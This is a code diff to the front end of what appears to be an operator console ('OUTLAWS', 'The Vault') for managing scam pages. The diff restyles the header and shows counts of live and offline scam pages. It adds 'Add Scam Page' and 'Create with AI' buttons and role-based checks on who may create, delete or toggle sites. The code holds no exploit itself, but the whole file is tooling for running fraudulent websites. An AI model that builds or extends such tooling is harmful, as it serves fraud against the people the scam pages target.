@@ -40,27 +40,56 @@ const DemoPagesPage = (() => {
       <div class="dp-page" id="demo-pages-root">
         <!-- Card Grid View -->
         <div id="dp-view-cards" class="dp-view dp-view--active">
-          <div class="dp-header">
-            <div><h1 class="dp-title">Scam Pages</h1><p class="dp-subtitle">Click a site to manage it</p></div>
-            <div style="display:flex;gap:10px;align-items:center;">
-              <button id="dp-guide-btn" class="dp-btn-ghost">
+          <!-- Gold-rush hero header -->
+          <div class="dp-header dp-header--gold">
+            <div class="dp-header-left">
+              <div class="dp-header-eyebrow">
+                <span class="dp-header-eyebrow-dot"></span>
+                <span>OUTLAWS · Operator Console</span>
+              </div>
+              <h1 class="dp-title dp-title--gold">
+                <span class="dp-title-glyph">✦</span>
+                <span>The Vault</span>
+                <span class="dp-title-count" id="dp-hero-count" title="Total scam pages">—</span>
+              </h1>
+              <p class="dp-subtitle dp-subtitle--gold">
+                <span id="dp-hero-live-count">—</span> live · <span id="dp-hero-off-count">—</span> offline
+                <span class="dp-subtitle-sep">·</span>
+                Pick a rig to open its workspace.
+              </p>
+            </div>
+            <div class="dp-header-actions">
+              <button id="dp-guide-btn" class="dp-btn-ghost dp-btn-ghost--gold">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
                 Guide
               </button>
-              <button id="dp-add-website-ai-btn" class="dp-btn-ghost" style="display:none;background:rgba(139,92,246,.15);color:#c084fc;border-color:rgba(139,92,246,.3);">
+              <button id="dp-add-website-ai-btn" class="dp-btn-ghost dp-btn-ghost--ai" style="display:none;">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>
-                🤖 Create with AI
+                Create with AI
               </button>
-              <button id="dp-add-website-btn" class="dp-btn-hero">
+              <button id="dp-add-website-btn" class="dp-btn-hero dp-btn-hero--gold">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
-                + Add Scam Page
+                Add Scam Page
               </button>
             </div>
           </div>
+
           <div class="dp-search-bar-wrap">
-            <div class="dp-search-bar-inner">
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;color:var(--text-muted);"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
-              <input id="dp-site-search" type="text" placeholder="Search sites by name…" class="dp-search-input" autocomplete="off" />
+            <div class="dp-search-bar-inner dp-search-bar-inner--gold">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;color:#D4AF37;"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+              <input
+                id="dp-site-search"
+                type="search"
+                placeholder="Search the vault by site name…"
+                class="dp-search-input"
+                autocomplete="off"
+                autocorrect="off"
+                autocapitalize="off"
+                spellcheck="false"
+                name="dp-search-${Math.random().toString(36).slice(2,10)}"
+                data-lpignore="true"
+                data-1p-ignore="true"
+                data-form-type="other" />
               <button id="dp-site-search-clear" class="dp-search-clear" style="display:none;" title="Clear">
                 <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
               </button>
@@ -287,11 +316,33 @@ const DemoPagesPage = (() => {
     const searchQ = (searchEl ? searchEl.value : '').toLowerCase().trim();
     const clearBtn = document.getElementById('dp-site-search-clear');
     const countEl = document.getElementById('dp-search-count');
-    const sites = searchQ
-      ? S().websites.filter(w => (w.name||'').toLowerCase().includes(searchQ) || (w.demo_slug||'').toLowerCase().includes(searchQ))
-      : S().websites;
+    // Sort: activated first, deactivated at the bottom (both keep original relative order)
+    const sortByActive = (arr) => arr.slice().sort((a, b) => {
+      const aa = a.is_active ? 1 : 0;
+      const bb = b.is_active ? 1 : 0;
+      if (aa !== bb) return bb - aa;  // active (1) before inactive (0)
+      return 0;
+    });
+    const sites = sortByActive(
+      searchQ
+        ? S().websites.filter(w => (w.name||'').toLowerCase().includes(searchQ) || (w.demo_slug||'').toLowerCase().includes(searchQ))
+        : S().websites
+    );
     if (clearBtn) clearBtn.style.display = searchQ ? 'flex' : 'none';
     if (countEl) { countEl.style.display = searchQ ? 'inline' : 'none'; countEl.textContent = `${sites.length} of ${S().websites.length}`; }
+
+    // Live counts in the gold-rush hero header.
+    const totalEl = document.getElementById('dp-hero-count');
+    const liveEl  = document.getElementById('dp-hero-live-count');
+    const offEl   = document.getElementById('dp-hero-off-count');
+    if (totalEl || liveEl || offEl) {
+      const total = S().websites.length;
+      const live  = S().websites.filter(w => w.is_active).length;
+      const off   = total - live;
+      if (totalEl) totalEl.textContent = total;
+      if (liveEl)  liveEl.textContent  = live;
+      if (offEl)   offEl.textContent   = off;
+    }
 
     if (!S().websites.length) {
       c.innerHTML=`<div class="dp-sites-empty"><svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="rgba(99,102,241,.28)" stroke-width="1"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg><p style="font-size:15px;font-weight:700;color:var(--text-primary);margin:0;">No Scam Pages yet</p><p style="font-size:12px;color:var(--text-secondary);margin:0;">Click <strong style="color:#a5b4fc;">+ Add Scam Page</strong> to get started</p></div>`;
@@ -967,12 +1018,36 @@ const DemoPagesPage = (() => {
   }
 
 
+  // Hide / disable buttons the current caller can't use, so the UI matches
+  // what the backend requireAction() guards will actually accept. Called
+  // after every render that could re-insert these controls into the DOM.
+  function applyActionPermissions() {
+    const can = (act) => !window.ALPAuth || window.ALPAuth.canAct('demo-pages', act);
+    const hide = (id) => { const el = document.getElementById(id); if (el) el.style.display = 'none'; };
+    if (!can('create'))    hide('dp-add-website-btn');
+    if (!can('ai-create')) hide('dp-add-website-ai-btn');
+    if (!can('delete'))    hide('dp-st-del-site-btn');
+    if (!can('toggle'))    {
+      const t = document.getElementById('dp-toggle-active-btn');
+      if (t) { t.disabled = true; t.title = 'You do not have permission to toggle sites.'; t.style.opacity = '.55'; t.style.cursor = 'not-allowed'; }
+      document.querySelectorAll('.dp-site-card-toggle').forEach(b => {
+        b.style.display = 'none';
+      });
+    }
+  }
+
   // ─── Lifecycle ────────────────────────────────────────────────────────────
   function init() {
     S().selectedWebsiteId=null; S().websites=[]; S().pages=[];
     _currentTab='upload'; _siteFiles=[];
     injectStyles();
-    loadWebsites();
+    loadWebsites().then(applyActionPermissions);
+    // Re-apply permissions any time the site cards or workspace re-render.
+    // Cheap enough to run on every click bubble that could trigger a render.
+    document.addEventListener('click', () => setTimeout(applyActionPermissions, 0), true);
+    // Live push from god's permission edits → app.js refreshes /me and then
+    // fires this DOM event, so we re-apply after the perms cache is fresh.
+    document.addEventListener('alp:permissions-applied', applyActionPermissions);
     $('dp-add-website-btn')?.addEventListener('click',()=>window.DemoPagesModals.showAddScamPageModal());
     $('dp-add-website-ai-btn')?.addEventListener('click',()=>window.DemoPagesModals.showAddScamPageWithAIModal());
     $('dp-guide-btn')?.addEventListener('click',()=>window.DemoPagesModals.openGuideModal());
